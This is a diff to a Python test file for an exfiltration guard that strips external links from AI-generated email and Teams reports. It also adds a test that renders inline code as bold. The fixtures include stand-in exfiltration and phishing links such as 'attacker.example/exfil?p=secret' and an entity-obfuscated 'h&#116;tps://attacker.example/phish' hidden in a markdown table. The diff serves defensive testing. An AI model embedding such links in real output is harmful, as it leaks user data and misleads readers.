@@ -174,10 +174,20 @@ class TestExternalUrlExfilGuard:
                 assert not any(child.type == "link_open" for token in tokens for child in token.children or [])
         assert "Report" in str(messages)
 
-    def test_email_strips_external_link_href_keeps_text(self) -> None:
-        html = render_ai_email_html("See [here](https://attacker.example/exfil?p=secret) for details.")
+    @pytest.mark.parametrize(
+        "markdown,label",
+        [
+            ("See [here](https://attacker.example/exfil?p=secret) for details.", "here"),
+            (
+                "a | b | c\n--- | --- | ---\n` | [Open [report]](h&#116;tps://attacker.example/phish) | `",
+                "Open [report]",
+            ),
+        ],
+    )
+    def test_email_strips_external_link_href_keeps_text(self, markdown: str, label: str) -> None:
+        html = render_ai_email_html(markdown)
         assert "attacker.example" not in html
-        assert "here" in html
+        assert label in html
 
     def test_email_keeps_posthog_links(self) -> None:
         html = render_ai_email_html("Open [the dashboard](https://app.posthog.com/insights/abc).")
@@ -801,6 +811,13 @@ class TestBuildAITeamsCard:
         assert sum(len(b["text"].encode("utf-8")) for b in body) <= TEAMS_CARD_TEXT_BUDGET
         assert len([b for b in body if set(b["text"]) == {filler}]) <= TEAMS_REPORT_BLOCK_COUNT
         assert "This report was shortened to fit." in body[-2]["text"]
+
+    def test_inline_code_in_the_report_shows_as_bold(self) -> None:
+        body = self._body("- `Signup conversion` fell `▼ 12%` to `31%` on _November 10_.\n\n```\nraw `x`\n```")
+
+        report = next(block["text"] for block in body if "Signup" in block.get("text", ""))
+        assert report.startswith("- **Signup conversion** fell **▼ 12%** to **31%** on _November 10_.")
+        assert "```\nraw `x`\n```" in report
 
     def test_external_links_in_the_report_are_stripped(self) -> None:
         body = self._body("See [the docs](https://evil.example.com/x) for more.")
